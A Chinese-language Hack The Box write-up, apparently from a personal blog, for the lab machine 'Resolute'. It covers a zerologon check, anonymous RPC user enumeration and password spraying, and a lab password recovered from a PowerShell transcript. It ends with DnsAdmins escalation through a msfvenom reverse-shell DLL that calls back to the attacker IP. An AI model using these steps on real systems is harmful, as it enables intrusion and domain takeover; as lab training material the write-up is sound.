@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="速通教程： 使用netexec扫一下漏洞 1 nxc smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; -M zerologon 发现该靶机适用 直接下载poc利用 成功了。。 以学习目的来，还是一步一步来看看其他的方">
+<title>Resolute</title>
+
+<link rel='canonical' href='https://nergigantes.github.io/htb/resolute/'>
+
+<link rel="stylesheet" href="/scss/style.min.f720cbcbc8f9265d2875caa41c2c2572405d50fc427ef4375391537c33376c29.css"><meta property='og:title' content="Resolute">
+<meta property='og:description' content="速通教程： 使用netexec扫一下漏洞 1 nxc smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; -M zerologon 发现该靶机适用 直接下载poc利用 成功了。。 以学习目的来，还是一步一步来看看其他的方">
+<meta property='og:url' content='https://nergigantes.github.io/htb/resolute/'>
+<meta property='og:site_name' content='NergiganteS&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Htb' /><meta property='article:published_time' content='2025-03-29T13:36:57&#43;08:00'/><meta property='article:modified_time' content='2025-03-29T13:37:44&#43;08:00'/><meta property='og:image' content='https://nergigantes.github.io/htb/resolute/10.jpg' />
+<meta name="twitter:title" content="Resolute">
+<meta name="twitter:description" content="速通教程： 使用netexec扫一下漏洞 1 nxc smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; -M zerologon 发现该靶机适用 直接下载poc利用 成功了。。 以学习目的来，还是一步一步来看看其他的方"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://nergigantes.github.io/htb/resolute/10.jpg' />
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu315a7ad84d8f1f09f998948c005c5c1b_42437_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">NergiganteS&#39;s Blog</a></h1>
+            <h2 class="site-description">分享学习笔记路程</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://nergigantes.github.io/en/" >English</option>
+                                
+                                    <option value="https://nergigantes.github.io/" selected>中文</option>
+                                
+                                    <option value="https://nergigantes.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb/resolute/">
+                <img src="/htb/resolute/10_huc46b369003db4f264a29b97c941dd2d8_869949_800x0_resize_q75_box.jpg"
+                        srcset="/htb/resolute/10_huc46b369003db4f264a29b97c941dd2d8_869949_800x0_resize_q75_box.jpg 800w, /htb/resolute/10_huc46b369003db4f264a29b97c941dd2d8_869949_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Resolute" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                Htb
+            </a>
+        
+            <a href="/categories/%E5%9F%9F/" >
+                域
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb/resolute/">Resolute</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 29, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="速通教程">速通教程：
+</h1><p>使用netexec扫一下漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nxc smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; -M zerologon
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现该靶机适用</p>
+<p>直接下载poc利用</p>
+<p><img src="/htb/resolute/1743167592656-14920750-9d26-4b1a-9c86-f945e9558464.png"
+	width="1102"
+	height="368"
+	srcset="/htb/resolute/1743167592656-14920750-9d26-4b1a-9c86-f945e9558464_hu73d093d354ad10802368004ddeeccb36_333090_480x0_resize_box_3.png 480w, /htb/resolute/1743167592656-14920750-9d26-4b1a-9c86-f945e9558464_hu73d093d354ad10802368004ddeeccb36_333090_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="299"
+		data-flex-basis="718px"
+	
+></p>
+<p>成功了。。</p>
+<h1 id="以学习目的来还是一步一步来看看其他的方法">以学习目的来，还是一步一步来看看其他的方法
+</h1><p>浅浅的扫一个端口</p>
+<p><img src="/htb/resolute/1743165991060-fda2ef86-0541-470d-ac92-afa79311099e.png"
+	width="1125"
+	height="618"
+	srcset="/htb/resolute/1743165991060-fda2ef86-0541-470d-ac92-afa79311099e_hua4d367766ff2f64c62a70748e2449c32_450383_480x0_resize_box_3.png 480w, /htb/resolute/1743165991060-fda2ef86-0541-470d-ac92-afa79311099e_hua4d367766ff2f64c62a70748e2449c32_450383_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="436px"
+	
+></p>
+<p>域名：megabank.local</p>
+<p>能够以匿名用户登陆rpc</p>
+<p>rpcclient -U &quot;&quot; -N 10.10.10.169</p>
+<p>并且能够执行enumdomusers命令列举用户</p>
+<p><img src="/htb/resolute/1743166061642-b6279afd-c139-4874-aaa8-a2bc096cc2f5.png"
+	width="1047"
+	height="814"
+	srcset="/htb/resolute/1743166061642-b6279afd-c139-4874-aaa8-a2bc096cc2f5_hu1323cb25abffdd4860c2d73941f79bc6_329989_480x0_resize_box_3.png 480w, /htb/resolute/1743166061642-b6279afd-c139-4874-aaa8-a2bc096cc2f5_hu1323cb25abffdd4860c2d73941f79bc6_329989_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="128"
+		data-flex-basis="308px"
+	
+></p>
+<p>使用netexec枚举一下通过smb活动的用户</p>
+<p><img src="/htb/resolute/1743168035799-22023b6e-d1b3-4960-895a-32b64ac82367.png"
+	width="1182"
+	height="851"
+	srcset="/htb/resolute/1743168035799-22023b6e-d1b3-4960-895a-32b64ac82367_huc88adcc6d93743e3de8a50cce17fa668_304797_480x0_resize_box_3.png 480w, /htb/resolute/1743168035799-22023b6e-d1b3-4960-895a-32b64ac82367_huc88adcc6d93743e3de8a50cce17fa668_304797_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="333px"
+	
+></p>
+<p>发现了一个有趣的东西</p>
+<p>marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123!</p>
+<p>尝试使用这个密码登陆，失败，那就用这个密码进行喷洒</p>
+<p>先把这些用户存起来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nxc smb 10.10.10.169 -u 1.txt -p Welcome123!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/resolute/1743168382297-8a483090-7d15-4c43-b562-1a6c51209072.png"
+	width="1189"
+	height="624"
+	srcset="/htb/resolute/1743168382297-8a483090-7d15-4c43-b562-1a6c51209072_hucc58ba8db2c595ccdd37ca70bcedb53a_235927_480x0_resize_box_3.png 480w, /htb/resolute/1743168382297-8a483090-7d15-4c43-b562-1a6c51209072_hucc58ba8db2c595ccdd37ca70bcedb53a_235927_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<p>可以看到melanie用户对映这个密码</p>
+<p><img src="/htb/resolute/1743168484793-de144225-3fb7-444f-a3b7-5beaa70e83d6.png"
+	width="1069"
+	height="657"
+	srcset="/htb/resolute/1743168484793-de144225-3fb7-444f-a3b7-5beaa70e83d6_hua314ff6b85ab41852b8a08ca7c2ec28c_220257_480x0_resize_box_3.png 480w, /htb/resolute/1743168484793-de144225-3fb7-444f-a3b7-5beaa70e83d6_hua314ff6b85ab41852b8a08ca7c2ec28c_220257_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="390px"
+	
+></p>
+<p>之后看看bloodhound</p>
+<p>目前这个用户没有什么可以进行利用的东西</p>
+<p>上传winpeas看看还有什么东西遗漏了</p>
+<p>很奇怪，这个靶机的winpeas用不了。。</p>
+<p>最后能够找到一个隐藏的文件</p>
+<p><code>type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code></p>
+<p>里面存放了ryan的密码</p>
+<p><img src="/htb/resolute/1743171446507-02fb3d9b-e338-4996-bdab-592dfc4760f9.png"
+	width="1048"
+	height="654"
+	srcset="/htb/resolute/1743171446507-02fb3d9b-e338-4996-bdab-592dfc4760f9_hua91333ccd9fa69dde23ef76d645804ca_123411_480x0_resize_box_3.png 480w, /htb/resolute/1743171446507-02fb3d9b-e338-4996-bdab-592dfc4760f9_hua91333ccd9fa69dde23ef76d645804ca_123411_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="384px"
+	
+></p>
+<p>Serv3r4Admin4cc123!</p>
+<p>在bloodhound里查看ryan</p>
+<p><img src="/htb/resolute/1743171500985-e707a7f6-17e1-4213-aab3-4fcf5eec64fa.png"
+	width="1403"
+	height="891"
+	srcset="/htb/resolute/1743171500985-e707a7f6-17e1-4213-aab3-4fcf5eec64fa_hu72b8d5596a7f0f2728e6d993090631be_105162_480x0_resize_box_3.png 480w, /htb/resolute/1743171500985-e707a7f6-17e1-4213-aab3-4fcf5eec64fa_hu72b8d5596a7f0f2728e6d993090631be_105162_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<p>能够看到这个账号是DNSADMIN用户里的，这样就可以进行提权了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.21 LPORT=9001 -f dll &gt; ff.dll
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成木马dll,利用impacket-smbserver开启smb服务远程挂载木马dll(上传本地会被吞)</p>
+<p>记得修改木马文件权限不然会失败</p>
+<p>chmod 777 ff.dll</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">impacket-smbserver s ./
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>之后执行</p>
+<p>cmd /c dnscmd localhost /config /serverlevelplugindll \10.10.16.21\s\ff.dll</p>
+<p><img src="/htb/resolute/1743225950746-61678890-8828-4116-b4b0-d581f8658a6e.png"
+	width="1177"
+	height="477"
+	srcset="/htb/resolute/1743225950746-61678890-8828-4116-b4b0-d581f8658a6e_hu8e87ae367af7c642ba8abf2c7f8c93f6_180817_480x0_resize_box_3.png 480w, /htb/resolute/1743225950746-61678890-8828-4116-b4b0-d581f8658a6e_hu8e87ae367af7c642ba8abf2c7f8c93f6_180817_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="592px"
+	
+></p>
+<p>sc.exe stop dns</p>
+<p>sc.exe start dns</p>
+<p><img src="/htb/resolute/1743226347930-fb6765c7-7994-4e21-b6ee-df68bbb1d87a.png"
+	width="2100"
+	height="721"
+	srcset="/htb/resolute/1743226347930-fb6765c7-7994-4e21-b6ee-df68bbb1d87a_hu6a46a415404ee219ad3125391c146c5c_417712_480x0_resize_box_3.png 480w, /htb/resolute/1743226347930-fb6765c7-7994-4e21-b6ee-df68bbb1d87a_hu6a46a415404ee219ad3125391c146c5c_417712_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="699px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 29, 2025 13:37 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb/blackfield/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/blackfield/19.4dbd6f6a43f6d2beadb97acfcb3a7ffa_hu4aa1dd88e39e4529686577550e201cfa_964272_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Blackfield"
+                        
+                        data-hash="md5-Tb1vakP20r6tuXrPyzp/&#43;g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Blackfield</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/sauna/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/sauna/3.1a3ba332db07695ffd237e0f12858e1c_hu0edf62eea5f63897e508bd0933d800cb_696703_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Sauna"
+                        
+                        data-hash="md5-GjujMtsHaV/9I34PEoWOHA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sauna</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/active/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/active/1.92b7a2ad9cdcb421afcb49cc205e6fa7_hud635dc65c578c3826fbc3164ed4ed890_1022125_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Active"
+                        
+                        data-hash="md5-kreirZzctCGvy0nMIF5vpw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Active</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/forest/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/forest/27.ae03b40a09d8f660b83467701cb220e8_hu902412dec8981223d15e2f092d55b9a4_883260_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Forest"
+                        
+                        data-hash="md5-rgO0CgnY9mC4NGdwHLIg6A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Forest</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/thenotebookdocker-%E9%80%83%E9%80%B8/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/thenotebookdocker-%E9%80%83%E9%80%B8/21.ba4c9461ff16c9df0e7383977eed892c_hub1af5c15598150491dd14105b4c023c2_926511_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post TheNotebook(Docker 逃逸)"
+                        
+                        data-hash="md5-ukyUYf8Wyd8Oc4OXfu2JLA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TheNotebook(Docker 逃逸)</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
